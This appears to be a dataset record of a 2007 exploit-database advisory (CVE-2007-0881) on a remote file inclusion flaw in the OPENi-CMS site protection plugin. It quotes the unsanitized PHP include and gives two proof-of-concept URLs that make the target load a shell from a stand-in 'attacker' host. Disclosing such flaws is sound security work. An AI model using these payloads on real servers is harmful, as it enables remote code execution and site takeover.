{
  "id": "3292",
  "title": "OPENi-CMS Site Protection Plugin - Remote File Inclusion",
  "cve": "CVE-2007-0881",
  "vuln_type": "unknown",
  "code": "------------------------------------------------------------------------------------\r\n[ECHO_ADV_64$2007] Openi CMS plugins (site protection) remote file inclusion\r\n------------------------------------------------------------------------------------\r\n\r\nAuthor : Ahmad Muammar W.K (a.k.a) y3dips\r\nDate Found : February, 11 2007\r\nLocation : Indonesia, Jakarta\r\nweb : http://echo.or.id/adv/adv64-y3dips-2007.txt\r\nCritical Lvl : Critical\r\n------------------------------------------------------------------------------------\r\n\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication : Internal range (site protection), version: 1.0\r\nOpeni CMS plugins (http://www.openi-cms.org)\r\nURL : http://www.openi-cms.org\r\nDownload-path : http://www.openi-cms.org/oi-download.php/45/file_src/oi_plugin_site_protection_1_0.zip\r\n\r\nDescription : With this Plugin you can release page ranges only for certain users. The user\r\nmust authentifizieren itself with user name and password. Several users for\r\na page range can be put on. Users and sides which can be protected are put on\r\nin the editorship environment by the administrator.\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n\r\nVariables \"oi_dir\" in index.php are not properly sanitized.\r\n\r\n---------------index.php --------------------\r\n...\r\n<?PHP\r\nglobal $config;\r\nrequire_once($config[\"oi_dir\"].\"/base/sitemap_classes.php\");\r\n\r\nclass plg_site_protection extends Plugin {\r\n...\r\n----------------------------------------------\r\n\r\n\r\nAn attacker can exploit this vulnerability with a simple php injection script.\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~~~~\r\n\r\nhttp://target-openi/open-admin/plugins/site_protection/index.php?config%5boi_dir%5d=http://attacker/shell.php ?\r\n\r\nNotes:\r\n~~~~~~\r\n\r\ni have to change the variable \"oi_dir\" to \"openi_dir\" to get the cms works (config file),\r\nbut then u just change the exploit to\r\n\r\nhttp://target-openi/open-admin/plugins/site_protection/index.php?config%5bopeni_dir%5d=http://attacker/shell.php?\r\n\r\nit doesnt matter coz the variable still unsanitized.\r\n\r\n---------------------------------------------------------------------------\r\nShoutz:\r\n~~~~~~~\r\n~ my lovely ana\r\n~ k-159 (never stop advising [pushing] me :P), the_day (echo young evil thinker),\r\n~ and all echo staff\r\n~ str0ke, waraxe, negative\r\n~ newbie_hacker@yahoogroups.com\r\n~ #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~~~~\r\n\r\ny3dips|| echo|staff || y3dips[at]gmail[dot]com\r\nHomepage: http://y3dips.echo.or.id/\r\n\r\n# milw0rm.com [2007-02-11]",
  "url": "https://www.exploit-db.com/exploits/3292"
}